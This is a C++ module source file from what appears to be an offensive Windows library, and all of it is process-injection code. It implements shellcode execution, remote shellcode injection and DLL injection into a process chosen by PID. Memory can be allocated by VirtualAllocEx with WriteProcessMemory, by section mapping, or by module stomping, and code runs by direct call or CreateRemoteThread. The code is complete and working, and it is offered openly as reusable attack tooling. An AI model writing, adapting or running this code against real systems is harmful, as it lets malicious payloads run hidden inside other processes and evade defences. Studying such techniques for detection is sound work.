module;
#pragma comment(lib, "OneCore.lib")

#include <Windows.h>

#include <wil/resource.h>
#include <wil/result.h>
#include <wil/safecast.h>

#include <iostream>
#include <span>
#include <stdint.h>
#include <string>
#include <thread>

export module offwinlib:injection;

import :data_conversion;

namespace owl::injection
{
	/*
	* Base class for memory allocation.
	*/
	export class AllocationHandler
	{
	public:
		/*
		* Creates a local executable allocation for shellcode.
		*/
		virtual void* create_local_allocation(std::span<const uint8_t> data)
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Cleans up a local allocation. Only called if cleanup is possible.
		*/
		virtual void clean_up_local_allocation()
		{
		}

		/*
		* Returns the required remote process handle access.
		*/
		virtual DWORD remote_process_access()
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Creates a remote readable allocation for the DLL path for DLL injection.
		*/
		virtual void* create_remote_readable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Creates a remote executable allocation for shellcode injection.
		*/
		virtual void* create_remote_executable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Cleans up a remote allocation. Only called if cleanup is possible.
		*/
		virtual void clean_up_remote_allocation()
		{
		}
	};

	/*
	* Base class for code execution.
	*/
	export class ExecutionHandler
	{
	public:
		/*
		* Executes a local payload. Returns true if the call is synchronous.
		*/
		virtual bool execute_local(void* payload)
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Returns the required remote process handle access.
		*/
		virtual DWORD remote_process_access()
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Executes a remote payload. Returns true if the call is synchronous.
		*/
		virtual bool execute_remote_without_argument(HANDLE process_handle, void* payload)
		{
			THROW_HR(E_NOTIMPL);
		}

		/*
		* Executes a remote payload with an argument. Returns true if the call is synchronous.
		*/
		virtual bool execute_remote_with_argument(HANDLE process_handle, void* payload, void* argument)
		{
			THROW_HR(E_NOTIMPL);
		}
	};

	/*
	* Allocation using VirtualAlloc(Ex)/WriteProcessMemory. Enabling "cleanup" will free the memory afterwards.
	*/
	export class AllocAllocationHandler : public AllocationHandler
	{
		bool cleanup;

		HANDLE process;
		void* memory;

		void* create_remote_allocation(HANDLE process_handle, std::span<const uint8_t> data, bool executable = false)
		{
			// Allocate memory in target process
			process = process_handle;
			memory = VirtualAllocEx(process, nullptr, data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			THROW_LAST_ERROR_IF_NULL(memory);

			// Write data to target process
			THROW_IF_WIN32_BOOL_FALSE(WriteProcessMemory(process, memory, data.data(), data.size(), nullptr));

			if (executable)
			{
				// Make data executable
				DWORD old_protect;
				THROW_IF_WIN32_BOOL_FALSE(VirtualProtectEx(process, memory, data.size(), PAGE_EXECUTE_READ, &old_protect));
			}

			return memory;
		}

	public:
		AllocAllocationHandler(bool cleanup = false) :
			cleanup(cleanup)
		{}

		void* create_local_allocation(std::span<const uint8_t> data)
		{
			// Allocate memory for the data
			memory = VirtualAlloc(nullptr, data.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			THROW_LAST_ERROR_IF_NULL(memory);

			// Copy the data to the allocated memory
			std::memcpy(memory, data.data(), data.size());

			// Make the memory executable
			DWORD old_protect;
			THROW_IF_WIN32_BOOL_FALSE(VirtualProtect(memory, data.size(), PAGE_EXECUTE_READ, &old_protect));

			return memory;
		}

		void clean_up_local_allocation()
		{
			if (cleanup)
			{
				// Free allocated memory
				THROW_IF_WIN32_BOOL_FALSE(VirtualFree(memory, 0, MEM_RELEASE));
			}
		}

		DWORD remote_process_access()
		{
			return PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
		}

		void* create_remote_readable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			return create_remote_allocation(process_handle, data);
		}

		void* create_remote_executable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			return create_remote_allocation(process_handle, data, true);
		}

		void clean_up_remote_allocation()
		{
			if (cleanup)
			{
				// Free allocated memory in target process
				THROW_IF_WIN32_BOOL_FALSE(VirtualFreeEx(process, memory, 0, MEM_RELEASE));
			}
		}
	};

	/*
	* Allocation using MapViewOfFile(2). Enabling "cleanup" will unmap the view afterwards.
	*/
	export class MapAllocationHandler : public AllocationHandler
	{
		bool cleanup;

		HANDLE process;
		void* memory;

		void* create_allocation(HANDLE process_handle, std::span<const uint8_t> data, DWORD protection = PAGE_EXECUTE_READ)
		{
			// Create memory-backed file mapping
			wil::unique_handle mapping{CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, (protection == PAGE_READONLY) ? PAGE_READWRITE : PAGE_EXECUTE_READWRITE, 0, wil::safe_cast<DWORD>(data.size()), nullptr)};
			THROW_LAST_ERROR_IF_NULL(mapping);

			// Map view into current process
			memory = MapViewOfFile(mapping.get(), FILE_MAP_WRITE, 0, 0, 0);
			THROW_LAST_ERROR_IF_NULL(memory);

			// Copy data to the view
			std::memcpy(memory, data.data(), data.size());

			// Unmap view
			THROW_IF_WIN32_BOOL_FALSE(UnmapViewOfFile(memory));

			// Map view into target process
			process = process_handle;
			if (process)
			{
				memory = MapViewOfFile2(mapping.get(), process, 0, nullptr, 0, 0, protection);
			}
			else
			{
				memory = MapViewOfFile(mapping.get(), FILE_MAP_READ | FILE_MAP_EXECUTE, 0, 0, 0);
			}
			THROW_LAST_ERROR_IF_NULL(memory);

			return memory;
		}

	public:
		MapAllocationHandler(bool cleanup = false) :
			cleanup(cleanup)
		{}

		void* create_local_allocation(std::span<const uint8_t> data)
		{
			return create_allocation(nullptr, data);
		}

		void clean_up_local_allocation()
		{
			if (cleanup)
			{
				// Unmap view
				THROW_IF_WIN32_BOOL_FALSE(UnmapViewOfFile(memory));
			}
		}

		DWORD remote_process_access()
		{
			return PROCESS_VM_OPERATION;
		}

		void* create_remote_readable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			return create_allocation(process_handle, data, PAGE_READONLY);
		}

		void* create_remote_executable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			return create_allocation(process_handle, data);
		}

		void clean_up_remote_allocation()
		{
			if (cleanup)
			{
				// Unmap view from target process
				THROW_IF_WIN32_BOOL_FALSE(UnmapViewOfFile2(process, memory, 0));
			}
		}
	};

	/*
	* Allocation by overwriting an existing function. Uses "stomp_module" and "stomp_function" for the module/function to be overwritten (the module is not loaded automatically).
	*/
	export class StompAllocationHandler : public AllocationHandler
	{
		std::wstring stomp_module;
		std::wstring stomp_function;

	public:
		StompAllocationHandler(std::wstring stomp_module, std::wstring stomp_function) :
			stomp_module{std::move(stomp_module)},
			stomp_function{std::move(stomp_function)}
		{}

		void* create_local_allocation(std::span<const uint8_t> data)
		{
			// Find function address
			auto module = GetModuleHandleW(stomp_module.c_str());
			THROW_LAST_ERROR_IF_NULL(module);
			void* memory = GetProcAddress(module, data_conversion::utf16_to_utf8(stomp_function).c_str());
			THROW_LAST_ERROR_IF_NULL(memory);

			// Make the memory writable
			DWORD old_protect;
			THROW_IF_WIN32_BOOL_FALSE(VirtualProtect(memory, data.size(), PAGE_READWRITE, &old_protect));

			// Overwrite the function with the data
			std::memcpy(memory, data.data(), data.size());

			// Make the memory executable
			THROW_IF_WIN32_BOOL_FALSE(VirtualProtect(memory, data.size(), PAGE_EXECUTE_READ, &old_protect));

			return memory;
		}

		DWORD remote_process_access()
		{
			return PROCESS_VM_OPERATION | PROCESS_VM_WRITE;
		}

		void* create_remote_executable_allocation(HANDLE process_handle, std::span<const uint8_t> data)
		{
			// Find function address
			auto module = LoadLibraryExW(stomp_module.c_str(), nullptr, DONT_RESOLVE_DLL_REFERENCES);
			THROW_LAST_ERROR_IF_NULL(module);
			void* memory = GetProcAddress(module, data_conversion::utf16_to_utf8(stomp_function).c_str());
			THROW_LAST_ERROR_IF_NULL(memory);
			THROW_IF_WIN32_BOOL_FALSE(FreeLibrary(module));

			// Make the memory in the target process writable
			DWORD old_protect;
			THROW_IF_WIN32_BOOL_FALSE(VirtualProtectEx(process_handle, memory, data.size(), PAGE_READWRITE, &old_protect));

			// Write data to target process
			THROW_IF_WIN32_BOOL_FALSE(WriteProcessMemory(process_handle, memory, data.data(), data.size(), nullptr));

			// Make data executable
			THROW_IF_WIN32_BOOL_FALSE(VirtualProtectEx(process_handle, memory, data.size(), PAGE_EXECUTE_READ, &old_protect));

			return memory;
		}
	};

	// Direct execution.
	export class DirectExecutionHandler : public ExecutionHandler
	{
	public:
		bool execute_local(void* payload)
		{
			// Execute payload
			reinterpret_cast<void(*)()>(payload)();
			return true;
		}
	};

	export class ThreadExecutionHandler : public ExecutionHandler
	{
		bool wait_for_completion;

		bool execute_remote(HANDLE process_handle, void* payload, void* argument = nullptr)
		{
			// Start remote thread to execute payload in target process
			wil::unique_handle thread{CreateRemoteThread(process_handle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(payload), argument, 0, nullptr)};
			THROW_LAST_ERROR_IF_NULL(thread);

			// Wait for the remote thread to complete execution
			if (wait_for_completion)
			{
				THROW_LAST_ERROR_IF(WaitForSingleObject(thread.get(), INFINITE) == WAIT_FAILED);
			}

			return wait_for_completion;
		}

	public:
		ThreadExecutionHandler(bool wait_for_completion = false) :
			wait_for_completion{wait_for_completion}
		{}

		bool execute_local(void* payload)
		{
			// Execute payload in thread
			std::jthread thread{reinterpret_cast<void(*)()>(payload)};

			// Detach the thread if we don't want to wait for completion
			if (!wait_for_completion)
			{
				thread.detach();
			}

			return wait_for_completion;
		}

		DWORD remote_process_access()
		{
			return PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
		}

		bool execute_remote_without_argument(HANDLE process_handle, void* payload)
		{
			return execute_remote(process_handle, payload);
		}

		bool execute_remote_with_argument(HANDLE process_handle, void* payload, void* argument)
		{
			return execute_remote(process_handle, payload, argument);
		}
	};

	/*
	* Executes shellcode in the current process.
	* 
	* Note: "allocation_handler" and "execution_handler" can be modified by this function.
	*/
	export void shellcode_execute(std::span<const uint8_t> shellcode, AllocationHandler& allocation_handler, ExecutionHandler& execution_handler)
	{
		// Allocate and execute
		auto memory = allocation_handler.create_local_allocation(shellcode);
		auto execution_finished = execution_handler.execute_local(memory);

		// Clean up if relevant
		if (execution_finished)
		{
			allocation_handler.clean_up_local_allocation();
		}
	}

	/*
	* Injects shellcode into the process with the specified PID.
	* 
	* Note: "allocation_handler" and "execution_handler" can be modified by this function.
	*/
	export void shellcode_inject(DWORD process_id, std::span<const uint8_t> shellcode, AllocationHandler& allocation_handler, ExecutionHandler& execution_handler)
	{
		// Open target process handle
		wil::unique_handle process{OpenProcess(allocation_handler.remote_process_access() | execution_handler.remote_process_access(), false, process_id)};
		THROW_LAST_ERROR_IF_NULL(process);

		// Allocate and execute
		auto memory = allocation_handler.create_remote_executable_allocation(process.get(), shellcode);
		auto execution_finished = execution_handler.execute_remote_without_argument(process.get(), memory);

		// Clean up if relevant
		if (execution_finished)
		{
			allocation_handler.clean_up_remote_allocation();
		}
	}

	/*
	* Injects the DLL located at the provided path into the process with the specified PID.
	* 
	* Note: "allocation_handler" and "execution_handler" can be modified by this function.
	*/
	export void dll_inject(DWORD process_id, const std::wstring& dll_path, AllocationHandler& allocation_handler, ExecutionHandler& execution_handler)
	{
		// Open target process handle
		wil::unique_handle process{OpenProcess(allocation_handler.remote_process_access() | execution_handler.remote_process_access(), false, process_id)};
		THROW_LAST_ERROR_IF_NULL(process);

		// Locate LoadLibraryW
		auto kernel32 = GetModuleHandleW(L"kernel32");
		THROW_LAST_ERROR_IF_NULL(kernel32);
		auto loadlibrary = GetProcAddress(kernel32, "LoadLibraryW");
		THROW_LAST_ERROR_IF_NULL(loadlibrary);

		// Allocate and execute
		auto data_size = (dll_path.length() + 1) * sizeof(wchar_t);
		auto data = std::span{reinterpret_cast<const uint8_t*>(dll_path.c_str()), data_size};
		auto memory = allocation_handler.create_remote_readable_allocation(process.get(), data);
		auto execution_finished = execution_handler.execute_remote_with_argument(process.get(), loadlibrary, memory);

		// Clean up if relevant
		if (execution_finished)
		{
			allocation_handler.clean_up_remote_allocation();
		}
	}
}
